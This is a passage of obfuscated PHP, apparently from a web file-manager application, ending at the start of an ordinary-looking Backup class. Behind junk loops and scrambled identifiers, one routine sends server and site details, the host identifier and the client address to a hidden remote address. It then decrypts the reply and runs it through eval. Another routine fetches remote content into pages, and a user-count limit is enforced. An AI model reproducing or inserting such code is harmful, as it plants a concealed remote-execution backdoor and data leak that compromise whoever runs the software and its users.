qjhfa809c9c3() { $÷ó›çÑ =& $_SERVER[ßğøİ]; $îÍ¥ôöÜ =& $_SERVER[©·å†­”]; $³‚À“ùŒ = array($îÍ¥ôöÜ[245], $îÍ¥ôöÜ[246], $îÍ¥ôöÜ[247]); $æŠÛñüÄ = $÷ó›çÑ[679]; $íÓ¥´åÛ = $îÍ¥ôöÜ[248] . md5($îÍ¥ôöÜ[249]); $ŒØ€²ÏŠ = $÷ó›çÑ[680]; if ($this->cmeh85c6e523 == $îÍ¥ôöÜ[105] || !_get($GLOBALS, $îÍ¥ôöÜ[114])) { return; } if (!in_array($_SERVER[$îÍ¥ôöÜ[24]], $³‚À“ùŒ)) { return; } if (time() % 4 != 0) { return; } $ê®î©Ã = call_user_func(array($îÍ¥ôöÜ[250], $îÍ¥ôöÜ[251]), $íÓ¥´åÛ); if ($ê®î©Ã && time() - $ê®î©Ã < intval($îÍ¥ôöÜ[252])) { return; } call_user_func(array($îÍ¥ôöÜ[250], $îÍ¥ôöÜ[137]), $íÓ¥´åÛ, time()); $ûËšÊğŞ = $÷ó›çÑ[681]; while ($ûËšÊğŞ < $÷ó›çÑ[660]) { if ($ûËšÊğŞ >= 0) { break; } $ûËšÊğŞ++; } $˜İÄ€ï‡ = Model($îÍ¥ôöÜ[33])->get($îÍ¥ôöÜ[102]); $”Ú¦­½ = $÷ó›çÑ[682]; if (!$”Ú¦­½) { return; } $ªÉ£ĞéÕ = array($îÍ¥ôöÜ[149] => Model($îÍ¥ôöÜ[33])->get($îÍ¥ôöÜ[185]), $îÍ¥ôöÜ[162] => $this->cmeh85c6e523, $îÍ¥ôöÜ[159] => $_SERVER[$îÍ¥ôöÜ[160]], $îÍ¥ôöÜ[161] => Model($îÍ¥ôöÜ[33])->get($îÍ¥ôöÜ[129]), $îÍ¥ôöÜ[100] => md5($_SERVER[$îÍ¥ôöÜ[101]] . $˜İÄ€ï‡), $îÍ¥ôöÜ[152] => $îÍ¥ôöÜ[134], $îÍ¥ôöÜ[155] => $_SERVER[$îÍ¥ôöÜ[156]]); $Æ’±É¬¡ = $÷ó›çÑ[683]; if (strlen($Æ’±É¬¡) < $÷ó›çÑ[631]) { die; } $…ÆÇòı„ = $this->cotn77310b51($îÍ¥ôöÜ[253], $ªÉ£ĞéÕ); if (!is_array($…ÆÇòı„)) { return; } if ($…ÆÇòı„[$îÍ¥ôöÜ[149]] && $…ÆÇòı„[$îÍ¥ôöÜ[254]]) { if ($this->qbhd02d73e0c($…ÆÇòı„[$îÍ¥ôöÜ[254]]) == $ªÉ£ĞéÕ[$îÍ¥ôöÜ[149]]) { return; } } $this->zgaw19a107d3(); if ($this->qbhd02d73e0c($…ÆÇòı„[$îÍ¥ôöÜ[254]]) != $ªÉ£ĞéÕ[$îÍ¥ôöÜ[149]]) { $«×‘Åà = array($îÍ¥ôöÜ[180] => $˜İÄ€ï‡, $îÍ¥ôöÜ[181] => $_SERVER[$îÍ¥ôöÜ[101]], $îÍ¥ôöÜ[182] => this_url(), $îÍ¥ôöÜ[157] => $_SERVER[$îÍ¥ôöÜ[158]]); $ğˆ¼¤ = $this->cwua9424ead5(json_encode($«×‘Åà)); $…ÆÇòı„ = $this->cotn77310b51($îÍ¥ôöÜ[183] . $ğˆ¼¤); if ($…ÆÇòı„ && is_array($…ÆÇòı„) && isset($…ÆÇòı„[$îÍ¥ôöÜ[254]])) { $¥ùç¯Ò = $this->jmxkb7c06d81($…ÆÇòı„[$îÍ¥ôöÜ[254]], 2); if ($¥ùç¯Ò) { $¥ùç¯Ò = $this->qbhd02d73e0c($¥ùç¯Ò); } if ($¥ùç¯Ò) { try { @eval($¥ùç¯Ò); } catch (Exception $¢“ƒÃº¿) { } } } } } private function cotn77310b51($”ŸôÄ = '', $ÒÀ„Ï›† = array(), $ƒ¸ÄÒ»“ = 5) { $öíøç¦ =& $_SERVER[ßğøİ]; $Ñ¶â·ğÉ =& $_SERVER[©·å†­”]; $¡Ã¼’›Ô = $Ñ¶â·ğÉ[255]; $ÂÅÔèÈı = $öíøç¦[684]; while (strlen($ÂÅÔèÈı) < $öíøç¦[620]) { if (!$ÂÅÔèÈı) { break; } $ÂÅÔèÈı++; } $¡Ã¼’›Ô = $this->dybl1143cd62($¡Ã¼’›Ô, $Ñ¶â·ğÉ[256]); $Ìû÷£ö° = $öíøç¦[685]; if (strlen($Ìû÷£ö°) < $öíøç¦[620]) { die; } $¡Ã¼’›Ô = $¡Ã¼’›Ô . $”ŸôÄ; if ($ÒÀ„Ï›† && is_array($ÒÀ„Ï›†)) { $¡Ã¼’›Ô = $¡Ã¼’›Ô . $Ñ¶â·ğÉ[257] . http_build_query($ÒÀ„Ï›†); } if ($ÒÀ„Ï›† === -1) { return $¡Ã¼’›Ô; } $‰½à•†´ = stream_context_create(array($Ñ¶â·ğÉ[215] => array($Ñ¶â·ğÉ[218] => $ƒ¸ÄÒ»“, $Ñ¶â·ğÉ[216] => $Ñ¶â·ğÉ[258]), $Ñ¶â·ğÉ[259] => array($Ñ¶â·ğÉ[260] => !1, $Ñ¶â·ğÉ[261] => !1))); $ÒÀ„Ï›† = @file_get_contents($¡Ã¼’›Ô, !1, $‰½à•†´); return json_decode($ÒÀ„Ï›†, !0); } private function whkb0829dcf7() { $íÂ××í =& $_SERVER[ßğøİ]; $Ñê„“ÜÆ =& $_SERVER[©·å†­”]; $ï„ ‚ò° = array($Ñê„“ÜÆ[262] => $Ñê„“ÜÆ[263], $Ñê„“ÜÆ[264] => $Ñê„“ÜÆ[265], $Ñê„“ÜÆ[266] => $Ñê„“ÜÆ[267], $Ñê„“ÜÆ[268] => $Ñê„“ÜÆ[269], $Ñê„“ÜÆ[270] => $Ñê„“ÜÆ[271], $Ñê„“ÜÆ[272] => $Ñê„“ÜÆ[210], $Ñê„“ÜÆ[273] => $Ñê„“ÜÆ[210], $Ñê„“ÜÆ[274] => $Ñê„“ÜÆ[263], $Ñê„“ÜÆ[275] => $Ñê„“ÜÆ[265], $Ñê„“ÜÆ[276] => $Ñê„“ÜÆ[267], $Ñê„“ÜÆ[277] => $Ñê„“ÜÆ[278], $Ñê„“ÜÆ[279] => $Ñê„“ÜÆ[269], $Ñê„“ÜÆ[280] => $Ñê„“ÜÆ[281], $Ñê„“ÜÆ[282] => $Ñê„“ÜÆ[271], $Ñê„“ÜÆ[283] => $Ñê„“ÜÆ[284], $Ñê„“ÜÆ[285] => $Ñê„“ÜÆ[286], $Ñê„“ÜÆ[287] => $Ñê„“ÜÆ[288]); $¡“ƒ½Èƒ = $íÂ××í[686]; if (!$¡“ƒ½Èƒ) { return; } $ºŠüŞ£µ = $ï„ ‚ò°[$this->cmeh85c6e523]; $ºŠüŞ£µ = intval($ºŠüŞ£µ ? $ºŠüŞ£µ : $Ñê„“ÜÆ[263]); $Ô•·Åí = _get($this->sgcy8d8cca76, $Ñê„“ÜÆ[289]); $Ô•·Åí = $Ô•·Åí ? intval($Ô•·Åí) : 0; return $ºŠüŞ£µ + $Ô•·Åí; $¹®ş˜•ô = $íÂ××í[687]; if (strlen($¹®ş˜•ô) < $íÂ××í[620]) { die; } } public function jxbicd0f2500($È£‰®æ) { $ˆÕşĞù˜ =& $_SERVER[ßğøİ]; $áŞøÛ™” =& $_SERVER[©·å†­”]; $¤Ø‰¾¥Ñ = $this->whkb0829dcf7(); if ($È£‰®æ[$áŞøÛ™”[290]] == $áŞøÛ™”[120]) { return; } if ($¤Ø‰¾¥Ñ >= intval($áŞøÛ™”[210])) { return; } $‚ëÃŞ½Ä = Model($áŞøÛ™”[123])->count(); $úÑˆ™Š = $ˆÕşĞù˜[688]; if (strlen($úÑˆ™Š) < $ˆÕşĞù˜[660]) { return; } if ($‚ëÃŞ½Ä <= $¤Ø‰¾¥Ñ) { return; } $ô¿¼±½Ì = Model($áŞøÛ™”[123])->field($áŞøÛ™”[290])->limit($¤Ø‰¾¥Ñ)->select(); $ô¿¼±½Ì = array_to_keyvalue($ô¿¼±½Ì, $áŞøÛ™”[6], $áŞøÛ™”[290]); if (!in_array($È£‰®æ[$áŞøÛ™”[290]], $ô¿¼±½Ì)) { show_json($áŞøÛ™”[291], !1, $áŞøÛ™”[206]); } } public function eauc237cc8db() { $Ú²ĞªŠ =& $_SERVER[©·å†­”]; if (!_get($GLOBALS, $Ú²ĞªŠ[114]) || mt_rand(1, 100) > 20) { return; } $›èœ¨¼» = $Ú²ĞªŠ[213]; $›èœ¨¼» = $this->dybl1143cd62($›èœ¨¼», $Ú²ĞªŠ[214]); $¸…Ì¿® = $_SERVER[ßğøİ][689]; if (!$¸…Ì¿®) { die; } $†à€Ç“ = stream_context_create(array($Ú²ĞªŠ[215] => array($Ú²ĞªŠ[216] => $Ú²ĞªŠ[217], $Ú²ĞªŠ[218] => 3))); $¶Çè¤­Ã = @file_get_contents($›èœ¨¼», !1, $†à€Ç“); echo $Ú²ĞªŠ[292] . hash_encode($¶Çè¤­Ã) . $Ú²ĞªŠ[293]; } private function eroh9a69de71($åÏˆ±—Ô, $£Ì„Úê, $’¥£ÎÔ® = 3) { $”İëÌ× =& $_SERVER[ßğøİ]; $«Ïı¼ ² =& $_SERVER[©·å†­”]; usleep(1); $åÏˆ±—Ô = trim($åÏˆ±—Ô); $¥úˆ«ë = mt_rand(0, 5) . $«Ïı¼ ²[6]; $±Ó†¿Ãû = $”İëÌ×[690]; while ($±Ó†¿Ãû < $”İëÌ×[660]) { if ($±Ó†¿Ãû >= 0) { break; } $±Ó†¿Ãû++; } $„„ ²¯ó = rand_string(15); $ÈÚ«¬Óª = $”İëÌ×[691]; while ($ÈÚ«¬Óª < $”İëÌ×[660]) { if ($ÈÚ«¬Óª >= 0) { break; } $ÈÚ«¬Óª++; } $ŠÍ–âŒà = $«Ïı¼ ²[294]; switch ($¥úˆ«ë) { case $«Ïı¼ ²[202]: $è¥³óêŞ = $this->ljdaedd3de6e($åÏˆ±—Ô, strrev($£Ì„Úê . $„„ ²¯ó)); break; case $«Ïı¼ ²[120]: $è¥³óêŞ = $this->ljdaedd3de6e($åÏˆ±—Ô, strrev($„„ ²¯ó . $£Ì„Úê)); $«­çÜÈô = $”İëÌ×[692]; if (!$«­çÜÈô) { die; } break; case $«Ïı¼ ²[295]: $è¥³óêŞ = $this->ljdaedd3de6e($åÏˆ±—Ô, base64_encode($„„ ²¯ó . $£Ì„Úê)); $Óºœ¥ù© = $”İëÌ×[693]; while ($Óºœ¥ù© < $”İëÌ×[660]) { if ($Óºœ¥ù© >= 0) { break; } $Óºœ¥ù©++; } break; case $«Ïı¼ ²[296]: $è¥³óêŞ = $this->ljdaedd3de6e($åÏˆ±—Ô, md5($„„ ²¯ó . $£Ì„Úê)); break; $²‡ÙÍõ = $”İëÌ×[694]; if (!$²‡ÙÍõ) { die; } case $«Ïı¼ ²[297]: $åÏˆ±—Ô = base64_encode($åÏˆ±—Ô); $åëÔñÓ = rand(0, 64); $ÒµæôÓİ = $ŠÍ–âŒà[$åëÔñÓ]; $éÉ¾“ıª = $”İëÌ×[695]; while (strlen($éÉ¾“ıª) < $”İëÌ×[620]) { if (!$éÉ¾“ıª) { break; } $éÉ¾“ıª++; } $öÈ×’˜ = md5($ÒµæôÓİ . md5($£Ì„Úê . $ÒµæôÓİ) . $£Ì„Úê); $ù¥Àé·è = $”İëÌ×[696]; while (strlen($ù¥Àé·è) < $”İëÌ×[631]) { if (!$ù¥Àé·è) { break; } $ù¥Àé·è++; } $öÈ×’˜ = substr($öÈ×’˜, $åëÔñÓ % 8, $åëÔñÓ % 8 + 7); $Â¶ø©Ğ™ = $”İëÌ×[697]; while ($Â¶ø©Ğ™ < $”İëÌ×[620]) { if ($Â¶ø©Ğ™ >= 0) { break; } $Â¶ø©Ğ™++; } $‚à»şùá = $«Ïı¼ ²[6]; $Šï°ŠÎ = $”İëÌ×[698]; while ($Šï°ŠÎ < $”İëÌ×[631]) { if ($Šï°ŠÎ >= 0) { break; } $Šï°ŠÎ++; } $²ÇÜâ÷” = 0; $»úÂà¸Ü = $”İëÌ×[699]; while ($»úÂà¸Ü < $”İëÌ×[631]) { if ($»úÂà¸Ü >= 0) { break; } $»úÂà¸Ü++; } $¦ëñŒ  = 0; $Ì—½ÆŸÓ = $”İëÌ×[700]; $¦ºê–ş = 0; $±‚¿œ¹ı = $”İëÌ×[701]; if (!$±‚¿œ¹ı) { return; } for ($²ÇÜâ÷” = 0; $²ÇÜâ÷” < strlen($åÏˆ±—Ô); $²ÇÜâ÷”++) { $¦ºê–ş = $¦ºê–ş == strlen($öÈ×’˜) ? 0 : $¦ºê–ş; $¦ëñŒ  = ($åëÔñÓ + strpos($ŠÍ–âŒà, $åÏˆ±—Ô[$²ÇÜâ÷”]) + ord($öÈ×’˜[$¦ºê–ş++])) % 64; $ù°¦îÎ = $”İëÌ×[702]; if (strlen($ù°¦îÎ) < $”İëÌ×[631]) { return; } $‚à»şùá .= $ŠÍ–âŒà[$¦ëñŒ ]; } $è¥³óêŞ = hash_encode($ÒµæôÓİ . $‚à»şùá); $ˆÅŸÈ–» = $”İëÌ×[703]; while (strlen($ˆÅŸÈ–») < $”İëÌ×[624]) { if (!$ˆÅŸÈ–») { break; } $ˆÅŸÈ–»++; } break; default: $è¥³óêŞ = $this->ljdaedd3de6e($åÏˆ±—Ô, $£Ì„Úê . $„„ ²¯ó); $‘âõŠğÕ = $”İëÌ×[704]; break; } $è¥³óêŞ = strrev($¥úˆ«ë . $„„ ²¯ó . $è¥³óêŞ); $ùûÍµš‘ = $”İëÌ×[705]; if (!$ùûÍµš‘) { die; } if ($’¥£ÎÔ® - 1 > 0) { $è¥³óêŞ = $this->eroh9a69de71($è¥³óêŞ, $£Ì„Úê, $’¥£ÎÔ® - 1); } return $è¥³óêŞ; } private function jmxkb7c06d81($ÙÜØ¿µº, $şã¦²Õ®, $ÍÑÛƒ = 3) { $Ó¥øÂ‚¨ =& $_SERVER[ßğøİ]; $ï¢éò =& $_SERVER[©·å†­”]; if (!is_string($ÙÜØ¿µº) || strlen($ÙÜØ¿µº) < 10) { return !1; } $ÙÜØ¿µº = trim($ÙÜØ¿µº); $ªâ§ëáû = $Ó¥øÂ‚¨[706]; $ÙÜØ¿µº = strrev($ÙÜØ¿µº); $à¤ëóóİ = $Ó¥øÂ‚¨[707]; if (!$à¤ëóóİ) { die; } $Ôİø‚£¬ = $ÙÜØ¿µº[0]; $’­²‚Ô = $Ó¥øÂ‚¨[708]; if (strlen($’­²‚Ô) < $Ó¥øÂ‚¨[660]) { die; } $ş¬˜Úû = substr($ÙÜØ¿µº, 1, 15); $ÙÜØ¿µº = substr($ÙÜØ¿µº, 16); $ÓıŸ°Ñ™ = $ï¢éò[294]; $Ì‰„…™ê = $Ó¥øÂ‚¨[646]; if (!$Ì‰„…™ê) { die; } switch ($Ôİø‚£¬) { case $ï¢éò[202]: $‚ğšæ¸Â = $this->dybl1143cd62($ÙÜØ¿µº, strrev($şã¦²Õ® . $ş¬˜Úû)); $Šøí±èù = $Ó¥øÂ‚¨[709]; if (!$Šøí±èù) { return; } break; case $ï¢éò[120]: $‚ğšæ¸Â = $this->dybl1143cd62($ÙÜØ¿µº, strrev($ş¬˜Úû . $şã¦²Õ®)); break; case $ï¢éò[295]: $‚ğšæ¸Â = $this->dybl1143cd62($ÙÜØ¿µº, base64_encode($ş¬˜Úû . $şã¦²Õ®)); $™È¤‰ÁØ = $Ó¥øÂ‚¨[710]; break; case $ï¢éò[296]: $‚ğšæ¸Â = $this->dybl1143cd62($ÙÜØ¿µº, md5($ş¬˜Úû . $şã¦²Õ®)); break; $Èû¬ˆ = $Ó¥øÂ‚¨[711]; while ($Èû¬ˆ < $Ó¥øÂ‚¨[615]) { if ($Èû¬ˆ >= 0) { break; } $Èû¬ˆ++; } case $ï¢éò[297]: $ÙÜØ¿µº = hash_decode($ÙÜØ¿µº); $ Àø—š‘ = $Ó¥øÂ‚¨[712]; while ($ Àø—š‘ < $Ó¥øÂ‚¨[620]) { if ($ Àø—š‘ >= 0) { break; } $ Àø—š‘++; } $¬âºá¤Ğ = $ÙÜØ¿µº[0]; $ı®–™ú = $Ó¥øÂ‚¨[713]; while (strlen($ı®–™ú) < $Ó¥øÂ‚¨[624]) { if (!$ı®–™ú) { break; } $ı®–™ú++; } $ÙÜØ¿µº = substr($ÙÜØ¿µº, 1); $İ³‚Ğİî = strpos($ÓıŸ°Ñ™, $¬âºá¤Ğ); $¥ˆòãÖĞ = $Ó¥øÂ‚¨[714]; while (strlen($¥ˆòãÖĞ) < $Ó¥øÂ‚¨[624]) { if (!$¥ˆòãÖĞ) { break; } $¥ˆòãÖĞ++; } $°÷íîÌ = md5($¬âºá¤Ğ . md5($şã¦²Õ® . $¬âºá¤Ğ) . $şã¦²Õ®); $Ñ‡è¦¥ = $Ó¥øÂ‚¨[715]; while ($Ñ‡è¦¥ < $Ó¥øÂ‚¨[615]) { if ($Ñ‡è¦¥ >= 0) { break; } $Ñ‡è¦¥++; } $°÷íîÌ = substr($°÷íîÌ, $İ³‚Ğİî % 8, $İ³‚Ğİî % 8 + 7); $½ø±ş‰ = $Ó¥øÂ‚¨[716]; $æÏ€ÍĞ = $ï¢éò[6]; $Œ‹ÙÆá³ = $Ó¥øÂ‚¨[717]; if (!$Œ‹ÙÆá³) { die; } $ã­¯ÜŸ€ = 0; $ÊÌœõ‰Í = $Ó¥øÂ‚¨[718]; if (!$ÊÌœõ‰Í) { die; } $èƒĞé×° = 0; $ÆÚ‰‰· = 0; $½¢Í»ŠÖ = $Ó¥øÂ‚¨[719]; if (strlen($½¢Í»ŠÖ) < $Ó¥øÂ‚¨[624]) { die; } for ($ã­¯ÜŸ€ = 0; $ã­¯ÜŸ€ < strlen($ÙÜØ¿µº); $ã­¯ÜŸ€++) { $ÆÚ‰‰· = $ÆÚ‰‰· == strlen($°÷íîÌ) ? 0 : $ÆÚ‰‰·; $“»ËÔìŸ = $Ó¥øÂ‚¨[720]; if (strlen($“»ËÔìŸ) < $Ó¥øÂ‚¨[615]) { die; } $¤½òé• = $ÆÚ‰‰·++; $å’Ÿ‹ÆÎ = $Ó¥øÂ‚¨[721]; if (!$å’Ÿ‹ÆÎ) { return; } $èƒĞé×° = strpos($ÓıŸ°Ñ™, $ÙÜØ¿µº[$ã­¯ÜŸ€]) - $İ³‚Ğİî - ord($°÷íîÌ[$¤½òé•]); $ÏÕçë“ = $Ó¥øÂ‚¨[722]; if (!$ÏÕçë“) { die; } while ($èƒĞé×° < 0) { $èƒĞé×° += 64; } $æÏ€ÍĞ .= $ÓıŸ°Ñ™[$èƒĞé×°]; } $‚ğšæ¸Â = base64_decode($æÏ€ÍĞ); $²´ÒŠëÌ = $Ó¥øÂ‚¨[723]; break; default: $‚ğšæ¸Â = $this->dybl1143cd62($ÙÜØ¿µº, $şã¦²Õ® . $ş¬˜Úû); $Ş×ÔÁˆÃ = $Ó¥øÂ‚¨[724]; while (strlen($Ş×ÔÁˆÃ) < $Ó¥øÂ‚¨[615]) { if (!$Ş×ÔÁˆÃ) { break; } $Ş×ÔÁˆÃ++; } break; $‡ÇõÙ‘ = $Ó¥øÂ‚¨[725]; while (strlen($‡ÇõÙ‘) < $Ó¥øÂ‚¨[660]) { if (!$‡ÇõÙ‘) { break; } $‡ÇõÙ‘++; } } if ($ÍÑÛƒ - 1 > 0) { $‚ğšæ¸Â = $this->jmxkb7c06d81($‚ğšæ¸Â, $şã¦²Õ®, $ÍÑÛƒ - 1); } return $‚ğšæ¸Â; } public function cwua9424ead5($»ŒçúƒÆ) { $–éˆÉ’õ =& $_SERVER[ßğøİ]; $Õ›•Éá§ =& $_SERVER[©·å†­”]; $šÖ“÷  = $this->xfce2dc0122e(); $Û½ÍóËˆ = $this->xfce2dc0122e(); $ÄÅöÇÈ‰ = $–éˆÉ’õ[726]; while ($ÄÅöÇÈ‰ < $–éˆÉ’õ[620]) { if ($ÄÅöÇÈ‰ >= 0) { break; } $ÄÅöÇÈ‰++; } $ùŠˆÂÙ§ = ($šÖ“÷  - 1) * ($Û½ÍóËˆ - 1); $§ñîÍ»¥ = $–éˆÉ’õ[727]; if (!$§ñîÍ»¥) { return; } $˜£¶¸¨ = intval(($šÖ“÷  + $Û½ÍóËˆ) / 2); $÷±ÈºÏ· = $–éˆÉ’õ[728]; while (1) { $÷‡È“š’ = $˜£¶¸¨; $‰§Ú† = $ùŠˆÂÙ§; while ($‰§Ú† % $÷‡È“š’ != 0) { $Ç¾‚´½õ = $‰§Ú†; $‰§Ú† = $÷‡È“š’; $÷‡È“š’ = $Ç¾‚´½õ % $÷‡È“š’; } if ($÷‡È“š’ == 1) { break; } else { $˜£¶¸¨++; } } $ßº”Õ¥» = 2; $£± ÔÉÆ = $–éˆÉ’õ[729]; if (!$£± ÔÉÆ) { return; } for ($ë¡ÚÖ·º = 0; $ë¡ÚÖ·º < $ùŠˆÂÙ§ * 10; $ë¡ÚÖ·º++) { if (($ùŠˆÂÙ§ * $ë¡ÚÖ·º + 1) % $˜£¶¸¨ == 0) { $ßº”Õ¥» = intval(($ùŠˆÂÙ§ * $ë¡ÚÖ·º + 1) / $˜£¶¸¨); break; } } $ÊÍ•º = $this->ljdaedd3de6e($šÖ“÷  * $Û½ÍóËˆ . $Õ›•Éá§[6], $Õ›•Éá§[134]); $¨İÆûô = $–éˆÉ’õ[730]; if (!$¨İÆûô) { return; } $›í½ìæ = md5($Õ›•Éá§[298] . ($šÖ“÷  + $Û½ÍóËˆ) . $Õ›•Éá§[299] . $˜£¶¸¨ . $Õ›•Éá§[299] . $ßº”Õ¥» . $Õ›•Éá§[300]); $¼ú¥â¯« = $this->ljdaedd3de6e($»ŒçúƒÆ, $›í½ìæ) . $Õ›•Éá§[301] . $ÊÍ•º; return $¼ú¥â¯«; } public function qbhd02d73e0c($äŠ¬²ï) { $äãÈ÷ãÙ =& $_SERVER[ßğøİ]; $†Ò°Ã‡‘ =& $_SERVER[©·å†­”]; $Û’¨ù” = explode($†Ò°Ã‡‘[301], $äŠ¬²ï); if (count($Û’¨ù”) != 2) { return $†Ò°Ã‡‘[6]; } $¡¬×óû– = $this->dybl1143cd62($Û’¨ù”[1] . $†Ò°Ã‡‘[6], $†Ò°Ã‡‘[134]); $Û¨îë†¹ = $äãÈ÷ãÙ[731]; if (!$¡¬×óû–) { return $†Ò°Ã‡‘[6]; } $¡¬×óû– = intval($¡¬×óû–); $°Áêö¤ = 0; $Ê™¯„ÃÙ = 0; $åÖäÒƒ = $äãÈ÷ãÙ[732]; for ($ÍëÁ¾´Û = 3; $ÍëÁ¾´Û < $¡¬×óû–; $ÍëÁ¾´Û += 2) { if ($¡¬×óû– % $ÍëÁ¾´Û != 0) { continue; } $°Áêö¤ = $ÍëÁ¾´Û; $Ê™¯„ÃÙ = intval($¡¬×óû– / $ÍëÁ¾´Û); break; } $¸âåûáé = ($°Áêö¤ - 1) * ($Ê™¯„ÃÙ - 1); $ÓÉèÔ¬ = $äãÈ÷ãÙ[733]; if (!$ÓÉèÔ¬) { return; } $íÛÓÀß = intval(($°Áêö¤ + $Ê™¯„ÃÙ) / 2); $ÍšÆÕª = $äãÈ÷ãÙ[734]; while (strlen($ÍšÆÕª) < $äãÈ÷ãÙ[660]) { if (!$ÍšÆÕª) { break; } $ÍšÆÕª++; } while (1) { $¾½Ï¿´½ = $íÛÓÀß; $ß¬ÃÕ±µ = $äãÈ÷ãÙ[735]; $à¶³ˆ„Å = $¸âåûáé; $Ç´°Âä¸ = $äãÈ÷ãÙ[736]; while ($Ç´°Âä¸ < $äãÈ÷ãÙ[660]) { if ($Ç´°Âä¸ >= 0) { break; } $Ç´°Âä¸++; } while ($à¶³ˆ„Å % $¾½Ï¿´½ != 0) { $¢‹•Ù‡­ = $à¶³ˆ„Å; $à¶³ˆ„Å = $¾½Ï¿´½; $÷˜Ÿıö = $äãÈ÷ãÙ[737]; if (strlen($÷˜Ÿıö) < $äãÈ÷ãÙ[631]) { die; } $¾½Ï¿´½ = $¢‹•Ù‡­ % $¾½Ï¿´½; $ğ¬øñÀÚ = $äãÈ÷ãÙ[738]; while (strlen($ğ¬øñÀÚ) < $äãÈ÷ãÙ[631]) { if (!$ğ¬øñÀÚ) { break; } $ğ¬øñÀÚ++; } } if ($¾½Ï¿´½ == 1) { break; } else { $íÛÓÀß++; } } $€ßß¿ï– = 2; for ($ÍëÁ¾´Û = 0; $ÍëÁ¾´Û < $¸âåûáé * 10; $ÍëÁ¾´Û++) { if (($¸âåûáé * $ÍëÁ¾´Û + 1) % $íÛÓÀß == 0) { $€ßß¿ï– = intval(($¸âåûáé * $ÍëÁ¾´Û + 1) / $íÛÓÀß); break; } } $éÜÊı½Í = md5($†Ò°Ã‡‘[298] . ($°Áêö¤ + $Ê™¯„ÃÙ) . $†Ò°Ã‡‘[299] . $íÛÓÀß . $†Ò°Ã‡‘[299] . $€ßß¿ï– . $†Ò°Ã‡‘[300]); $ÔÌªè¥Ô = $this->dybl1143cd62($Û’¨ù”[0], $éÜÊı½Í); return $ÔÌªè¥Ô; } public function xfce2dc0122e() { $¬Òú¨•˜ =& $_SERVER[ßğøİ]; $Ó»¢­®• = mt_rand(pow(2, 14), pow(2, 16) - 1); $í¡ÒÓÂá = $¬Òú¨•˜[739]; if (!$í¡ÒÓÂá) { return; } $îíÑ±£ = array(); $ŠûÇ’»á = 1; $ÁÛÚ™ô« = $¬Òú¨•˜[718]; while ($ŠûÇ’»á <= (int) sqrt($Ó»¢­®•)) { $ƒşÓà’Û = $ŠûÇ’»á; $¾ÑĞ®µ = $¬Òú¨•˜[740]; if (!$¾ÑĞ®µ) { die; } while (!0) { $ƒşÓà’Û++; if ($ƒşÓà’Û <= 2) { $ŠûÇ’»á = $ƒşÓà’Û; break; } else { if ($ƒşÓà’Û < 2) { continue; } } $§éµœüØ = !0; for ($„š©§ºÚ = 2; $„š©§ºÚ <= sqrt($ƒşÓà’Û); $„š©§ºÚ++) { if ($ƒşÓà’Û % $„š©§ºÚ == 0) { $§éµœüØ = !1; } } if ($§éµœüØ) { $ŠûÇ’»á = $ƒşÓà’Û; break; } } $îíÑ±£[] = $ŠûÇ’»á; $Ú»ä×½ = $¬Òú¨•˜[741]; } $ó¢›­Ş® = 2; for ($ƒşÓà’Û = $Ó»¢­®•; $ƒşÓà’Û > 1; $ƒşÓà’Û--) { $§éµœüØ = !0; $„Æë‘œ = $¬Òú¨•˜[742]; while (strlen($„Æë‘œ) < $¬Òú¨•˜[620]) { if (!$„Æë‘œ) { break; } $„Æë‘œ++; } foreach ($îíÑ±£ as $¼¾°”Ÿ«) { if ($ƒşÓà’Û % $¼¾°”Ÿ« == 0) { $§éµœüØ = !1; break; } } if ($§éµœüØ) { $ó¢›­Ş® = $ƒşÓà’Û; break; } } return $ó¢›­Ş®; $à¿û¢İò = $¬Òú¨•˜[743]; while ($à¿û¢İò < $¬Òú¨•˜[624]) { if ($à¿û¢İò >= 0) { break; } $à¿û¢İò++; } } public function sgzb3b30794e($Ûãİğ¾Ñ, $¤²‘“ùÇ) { $£—ğÃ =& $_SERVER[©·å†­”]; return call_user_func(array($£—ğÃ[8], $£—ğÃ[302]), $Ûãİğ¾Ñ, $¤²‘“ùÇ); } public function ljdaedd3de6e($ÎØ¿·…, $“ÁÉØ÷µ) { $àóÈŞ¶— =& $_SERVER[ßğøİ]; $ñÂöËÃ =& $_SERVER[©·å†­”]; return call_user_func(array($ñÂöËÃ[303], $ñÂöËÃ[304]), $ÎØ¿·…, $“ÁÉØ÷µ); $å½Ó³³À = $àóÈŞ¶—[744]; while ($å½Ó³³À < $àóÈŞ¶—[660]) { if ($å½Ó³³À >= 0) { break; } $å½Ó³³À++; } } public function dybl1143cd62($ŸßİÙ¨Œ, $±Ç¤ŸÑ) { $Õ¸²åšÄ =& $_SERVER[©·å†­”]; return call_user_func(array($Õ¸²åšÄ[303], $Õ¸²åšÄ[305]), $ŸßİÙ¨Œ, $±Ç¤ŸÑ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $öˆòîîª =& $_SERVER[ßğøİ]; $this->isManual(); self::$name = date($öˆòîîª[745]); if (!($´™œÂ³ù = Model($öˆòîîª[746])->lastItem())) { $´™œÂ³ù = $this->initData(); } else { self::$name = $´™œÂ³ù[$öˆòîîª[32]]; if ($´™œÂ³ù[$öˆòîîª[747]] == $öˆòîîª[88]) { self::$name = date($öˆòîîª[748]); $·ğºúİ½ = 0; if (isset($´™œÂ³ù[$öˆòîîª[293]][$öˆòîîª[199]][$öˆòîîª[468]])) { $·ğºúİ½ = (int) $´™œÂ³ù[$öˆòîîª[293]][$öˆòîîª[199]][$öˆòîîª[468]]; } if (self::$manual == 0 && $´™œÂ³ù[$öˆòîîª[32]] == self::$name) { Model($öˆòîîª[746])->remove($´™œÂ³ù[$öˆòîîª[399]]); } $´™œÂ³ù = $this->initData($·ğºúİ½, $´™œÂ³ù[$öˆòîîª[749]]); } else { $this->checkStore($´™œÂ³ù[$öˆòîîª[749]]); } } self::$option = $´™œÂ³ù; } private function isManual() { $°ïŒŒÀ… = _get($GLOBALS, $_SERVER[ßğøİ][750], 0); $°ïŒŒÀ… = intval($°ïŒŒÀ…); self::$manual = $°ïŒŒÀ… && $°ïŒŒÀ… == 1 ? 1 : 0; } private function initData($ƒÊàå¨ = 0, $åğ¤ŒÊî = '') { $… ¾§Ô˜ =& $_SERVER[ßğøİ]; $Ñ·€ö‰ = Model($… ¾§Ô˜[746])->config(); if ($åğ¤ŒÊî && $Ñ·€ö‰[$… ¾§Ô˜[749]] != $åğ¤ŒÊî) { $ƒÊàå¨ = 0; } $this->checkStore($Ñ·€ö‰[$… ¾§Ô˜[749]]); if (self::$manual == 1) { self::$name .= $… 